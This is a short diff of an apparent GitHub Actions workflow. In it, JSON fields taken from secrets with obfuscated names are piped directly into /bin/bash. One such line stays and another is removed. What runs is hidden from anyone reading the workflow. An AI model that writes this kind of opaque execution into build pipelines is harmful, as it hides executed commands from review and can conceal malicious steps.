@@ -21,7 +21,6 @@ jobs:
           e359: ${{ secrets.e359 }}
         run: |
           printf '%s' "$e359" | jq -r .esob2616 | /bin/bash
-          echo $fm9866 | jq -r .s4526 | /bin/bash
 
       - name: Store artifact
         if: always()
